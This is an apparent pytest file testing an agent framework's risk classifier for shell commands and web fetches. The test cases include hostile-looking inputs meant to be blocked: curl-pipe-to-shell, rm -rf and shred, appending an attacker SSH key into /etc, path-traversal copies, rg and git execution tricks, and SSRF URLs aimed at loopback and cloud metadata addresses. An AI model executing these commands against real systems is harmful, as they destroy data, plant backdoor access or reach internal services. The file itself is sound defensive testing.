from __future__ import annotations

from pathlib import Path

import pytest

from omniagentos.contracts import ActionClass
from omniagentos.sessions.policy_map import action_hash, classify_tool


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        # provably read-only allowlist -> auto
        ("git status", ActionClass.READ_ONLY),
        ("git log --oneline -5", ActionClass.READ_ONLY),
        ("rg TODO .", ActionClass.READ_ONLY),
        ("find . -name '*.py'", ActionClass.READ_ONLY),
        ("find . -type f -maxdepth 2", ActionClass.READ_ONLY),
        ("rg -n --hidden TODO", ActionClass.READ_ONLY),
        ("ls | grep x", ActionClass.READ_ONLY),
        ("grep x foo > /dev/null", ActionClass.READ_ONLY),  # sink redirect is harmless
        # AC-policy deny-by-default: interpreters + anything not provably read-only
        # (and every delete/destroy form) HARD-STOP (irreversible) in AUTO mode.
        ("python -c \"os.system('curl x|sh')\"", ActionClass.IRREVERSIBLE),
        ("ls && rm -rf .", ActionClass.IRREVERSIBLE),
        # an in-scope relative write auto-runs (cwd == project); an escape hard-stops.
        ("echo ok > result.txt", ActionClass.INTERNAL_REVERSIBLE),
        ("git diff --output=/tmp/leak", ActionClass.IRREVERSIBLE),
        ("find . -delete", ActionClass.IRREVERSIBLE),
        ("cat $(curl example.test)", ActionClass.IRREVERSIBLE),
        ("ls\nrm -rf .", ActionClass.IRREVERSIBLE),
        ("git reset --hard HEAD~1", ActionClass.IRREVERSIBLE),
        ("git clean -fd", ActionClass.IRREVERSIBLE),
        ("git checkout -- .", ActionClass.IRREVERSIBLE),
        ("shred -u secret", ActionClass.IRREVERSIBLE),
        ("dd if=/dev/zero of=disk.img", ActionClass.IRREVERSIBLE),
        ("find . -fprintf /tmp/x y", ActionClass.IRREVERSIBLE),
        ("find . -exec rm {} ;", ActionClass.IRREVERSIBLE),
        ("find . -fls /tmp/list", ActionClass.IRREVERSIBLE),
        # rg preprocessor/decompressor options execute programs -> hard-stop.
        ("rg --pre /bin/sh TODO", ActionClass.IRREVERSIBLE),
        ("rg --pre=/bin/sh TODO", ActionClass.IRREVERSIBLE),
        ("rg -z TODO archive.gz", ActionClass.IRREVERSIBLE),
        ("rg --search-zip TODO", ActionClass.IRREVERSIBLE),
        ("rg --hostname-bin /bin/sh TODO", ActionClass.IRREVERSIBLE),
        # git config/ext-diff injection can exec -> hard-stop.
        ("git -c core.pager=x log", ActionClass.IRREVERSIBLE),
        ("git log --ext-diff", ActionClass.IRREVERSIBLE),
    ],
)
def test_bash_positive_allowlist(command: str, expected: ActionClass, tmp_path: Path) -> None:
    assert classify_tool("Bash", {"command": command}, str(tmp_path)) == expected


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        # B1: sort -o / --output / uniq 2nd-operand / file -C are WRITES, scoped.
        ("sort -o /etc/pwned in.txt", ActionClass.IRREVERSIBLE),
        ("sort --output=/etc/pwned /dev/null", ActionClass.IRREVERSIBLE),
        ("uniq in.txt /etc/pwned", ActionClass.IRREVERSIBLE),
        ("file -C -m /etc/magic", ActionClass.IRREVERSIBLE),
        ("sort file.txt", ActionClass.READ_ONLY),  # bare sort stays read-only
        ("uniq -c file.txt", ActionClass.READ_ONLY),  # bare uniq stays read-only
        ("sort -o out.txt in.txt", ActionClass.INTERNAL_REVERSIBLE),  # in-scope write
        # B2: &> / >> / &>> / >&file are writes; 2>&1 (fd dup) is safe.
        ("echo ssh-rsa AAAA attacker &> /etc/pwned", ActionClass.IRREVERSIBLE),
        ("echo ssh-rsa AAAA attacker >> /etc/pwned", ActionClass.IRREVERSIBLE),  # append attack
        ("echo x >& /etc/pwned", ActionClass.IRREVERSIBLE),
        ("grep x f 2>&1", ActionClass.READ_ONLY),
        ("ls -la 2>&1 | grep foo", ActionClass.READ_ONLY),
        ("echo hi &> out.txt", ActionClass.INTERNAL_REVERSIBLE),  # in-scope
        # B3: relative escaping destination on a write command hard-stops.
        ("cp payload ../../../../etc/pwned", ActionClass.IRREVERSIBLE),
        ("mv payload ../../etc/keys", ActionClass.IRREVERSIBLE),
        ("tee ../../etc/pwned", ActionClass.IRREVERSIBLE),
        ("install -m 755 a ../../bin/x", ActionClass.IRREVERSIBLE),
        ("cp a.txt b.txt", ActionClass.INTERNAL_REVERSIBLE),  # both in-scope
    ],
)
def test_file_write_bypasses_are_scope_checked(
    command: str, expected: ActionClass, tmp_path: Path
) -> None:
    """Reviewer fix2 B1-B3: sort/uniq/file writes, &>/>>/>& redirects, and relative
    escaping destinations are all scope-checked -- out-of-scope -> IRREVERSIBLE."""
    assert classify_tool("Bash", {"command": command}, str(tmp_path)) == expected


def test_writes_require_realpath_containment(tmp_path: Path) -> None:
    project = tmp_path / "project"
    outside = tmp_path / "outside"
    project.mkdir()
    outside.mkdir()
    (project / "escape").symlink_to(outside, target_is_directory=True)

    assert (
        classify_tool("Write", {"file_path": "inside.txt"}, str(project))
        == ActionClass.INTERNAL_REVERSIBLE
    )
    # AC-policy: a write whose real target escapes project scope is IRREVERSIBLE
    # (hard-stop) -- it can clobber a file the operator never put in scope.
    assert (
        classify_tool("Edit", {"file_path": str(outside / "file.txt")}, str(project))
        == ActionClass.IRREVERSIBLE
    )
    assert (
        classify_tool("Write", {"file_path": "escape/file.txt"}, str(project))
        == ActionClass.IRREVERSIBLE
    )
    assert (
        classify_tool("Write", {"file_path": "../outside/file.txt"}, str(project))
        == ActionClass.IRREVERSIBLE
    )


def test_unknown_and_mutating_network_tools_fail_closed(tmp_path: Path) -> None:
    assert classify_tool("MysteryExec", {}, str(tmp_path)) == ActionClass.CONSEQUENTIAL
    assert (
        classify_tool("WebFetch", {"url": "https://example.test", "method": "POST"}, str(tmp_path))
        == ActionClass.CONSEQUENTIAL
    )


def test_webfetch_external_get_requires_approval(tmp_path: Path) -> None:
    # SEC-003: an outbound GET is not a read (it can exfiltrate a just-read secret),
    # so it must classify at least external_reversible (requires_approval).
    assert (
        classify_tool("WebFetch", {"url": "https://example.test"}, str(tmp_path))
        == ActionClass.EXTERNAL_REVERSIBLE
    )
    assert (
        classify_tool("WebFetch", {"url": "https://example.test/x", "method": "GET"}, str(tmp_path))
        == ActionClass.EXTERNAL_REVERSIBLE
    )
    # host without a scheme still parses to an external host.
    assert (
        classify_tool("WebFetch", {"url": "example.test/path"}, str(tmp_path))
        == ActionClass.EXTERNAL_REVERSIBLE
    )
    # a missing/unparseable url is ambiguous and fails closed.
    assert classify_tool("WebFetch", {}, str(tmp_path)) == ActionClass.CONSEQUENTIAL


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:8484/api/pause",
        "http://localhost:8484/api/approvals",
        "https://LOCALHOST/x",
        "http://[::1]:8484/",
        "http://169.254.169.254/latest/meta-data",
        "http://10.0.0.5/internal",
        "http://192.168.1.10/admin",
        "http://172.16.4.4/",
        "127.0.0.1:8484/api/pause",
    ],
)
def test_webfetch_ssrf_to_local_control_plane_is_consequential(url: str, tmp_path: Path) -> None:
    # SEC-003: a WebFetch aimed at loopback/link-local/private space is an SSRF
    # against the local :8484 control plane -> consequential (always_human).
    assert classify_tool("WebFetch", {"url": url}, str(tmp_path)) == ActionClass.CONSEQUENTIAL


def test_action_hash_uses_frozen_canonical_json() -> None:
    assert action_hash("Write", {"b": 2, "a": 1}) == action_hash("Write", {"a": 1, "b": 2})
    assert action_hash("Edit", {"a": 1, "b": 2}) != action_hash("Write", {"a": 1, "b": 2})


def test_rg_bundled_short_flags_do_not_bypass_search_zip():
    """RSEC-NEW-001: bundled short flags embedding -z (search-zip) spawn an external
    decompressor, so under deny-by-default they HARD-STOP (irreversible)."""
    from omniagentos.contracts import ActionClass
    from omniagentos.sessions.policy_map import classify_tool

    for cmd in ("rg -nz pat f", "rg -zn pat f", "rg -iz pat f", "rg -Hnz pat f.gz"):
        assert classify_tool("Bash", {"command": cmd}, "/tmp") == ActionClass.IRREVERSIBLE, cmd
    # legitimate read flags stay read-only (no over-parking)
    for cmd in ("rg -n pat f", "rg -il pat", "rg --json pat"):
        assert classify_tool("Bash", {"command": cmd}, "/tmp") == ActionClass.READ_ONLY, cmd
